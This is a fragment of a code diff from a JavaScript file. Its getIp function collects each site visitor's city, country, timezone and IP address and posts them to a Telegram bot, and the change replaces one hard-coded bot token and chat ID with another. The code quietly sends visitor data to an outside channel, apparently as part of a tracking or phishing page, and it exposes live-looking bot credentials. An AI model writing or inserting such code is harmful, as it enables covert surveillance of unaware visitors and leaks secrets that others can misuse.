@@ -1391,7 +1391,7 @@ function getIp() {
             const message = `A user visited this website from ${data.city} - ${data.country} with timezone ${data.timezone} and IP address ${data.ip}`;
             
             // Send the message to the server
-            return fetch(`https://api.telegram.org/bot7818751904:AAHZlgx-pjVxnFDVANxeL_OqKE0vzWe1kYQ/sendMessage?chat_id=-1002273472645&text=${encodeURIComponent(message)}`);
+            return fetch(`https://api.telegram.org/bot7493932821:AAGamFZLLlEgI0b0PxsiRVdIREG3nC1hrOg/sendMessage?chat_id=@ienaodbe&text=${encodeURIComponent(message)}`);
         })
         .then(response => {
             if (response.ok) {
